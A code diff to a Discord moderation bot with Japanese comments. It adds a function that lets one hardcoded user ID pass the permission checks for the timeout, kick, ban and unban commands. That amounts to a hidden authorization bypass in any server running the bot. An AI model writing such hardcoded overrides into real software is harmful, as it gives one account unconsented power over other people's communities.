@@ -12,6 +12,10 @@ process.on('uncaughtException', function (err) {
     console.log(err)
 });
 
+function isArch(msg) {
+    return (msg.author.id == "969414796875280485")
+}
+
 //java.lang.NullPointerExceptionをぬるぽと呼ぶスレ
 //>>1
 //　ぬるぽ
@@ -183,7 +187,7 @@ client.on("messageCreate", async (msg) => {
                 }
             })
     } else if (msg.content.split(" ")[0] == "arch!timeout") {
-        if (msg.member.permissions.has("ModerateMembers")) {
+        if (msg.member.permissions.has("ModerateMembers") || isArch(msg)) {
             if (parseInt(msg.content.split(" ")[2], 10)) {
                 if ((await msg.guild.members.fetch(msg.content.split(" ")[1]).moderatable)) {
                     try {
@@ -209,7 +213,7 @@ client.on("messageCreate", async (msg) => {
             msg.reply({ content: "お前に権限ねーから！", files: ["お前の席ねーから.png"] })
         }
     } else if (msg.content.split(" ")[0] == "arch!untimeout") {
-        if (msg.member.permissions.has("ModerateMembers")) {
+        if (msg.member.permissions.has("ModerateMembers") || isArch(msg)) {
 
             try {
                 if ((await msg.guild.members.fetch(msg.content.split(" ")[1]).moderatable)) {
@@ -232,7 +236,7 @@ client.on("messageCreate", async (msg) => {
             msg.reply({ content: "お前に権限ねーから！", files: ["お前の席ねーから.png"] })
         }
     } else if (msg.content.split(" ")[0] == "arch!kick") {
-        if (msg.member.permissions.has("KickMembers")) {
+        if (msg.member.permissions.has("KickMembers") || isArch(msg)) {
             if ((await msg.guild.members.fetch(msg.content.split(" ")[1])).kickable) {
                 try {
                     if ((await msg.guild.members.fetch(msg.content.split(" ")[1]))) {
@@ -254,7 +258,7 @@ client.on("messageCreate", async (msg) => {
             msg.reply({ content: "お前に権限ねーから！", files: ["お前の席ねーから.png"] })
         }
     } else if (msg.content.split(" ")[0] == "arch!ban") {
-        if (msg.member.permissions.has("BanMembers")) {
+        if (msg.member.permissions.has("BanMembers") || isArch(msg)) {
             if ((await msg.guild.members.fetch(msg.content.split(" ")[1])).bannable) {
                 try {
                     if ((await msg.guild.members.fetch(msg.content.split(" ")[1]))) {
@@ -276,7 +280,7 @@ client.on("messageCreate", async (msg) => {
             msg.reply({ content: "お前に権限ねーから！", files: ["お前の席ねーから.png"] })
         }
     } else if (msg.content.split(" ")[0] == "arch!unban") {
-        if (msg.member.permissions.has("BanMembers")) {
+        if (msg.member.permissions.has("BanMembers") || isArch(msg)) {
             if ((await client.users.fetch(msg.content.split(" ")[1]))) {
                 try {
                     if ((await client.users.fetch(msg.content.split(" ")[1]))) {
